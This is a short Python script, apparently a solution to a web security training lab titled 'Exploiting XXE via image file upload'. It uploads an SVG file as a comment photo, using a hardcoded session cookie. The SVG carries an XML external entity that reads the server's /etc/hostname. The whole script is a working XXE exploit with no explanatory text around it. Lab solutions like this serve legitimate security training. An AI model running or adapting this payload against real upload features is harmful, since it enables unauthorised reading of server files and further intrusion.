# Exploiting XXE via image file upload

import requests

url = "https://0ab900d7044ab83dc0fa29d9006b009d.web-security-academy.net/"

headers = {
	"Referer": url + "post?postId=2"
}

cookies = {
	"session": "ALYGYdLOJYAdHdFJxTYaKy29GSkFEN6p"
}

payload = """
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
"""

file = {
	"photo": ("photo", payload)
}

r = requests.post(url + "post/comment",headers=headers, files=file, cookies=cookies)

print(r.text)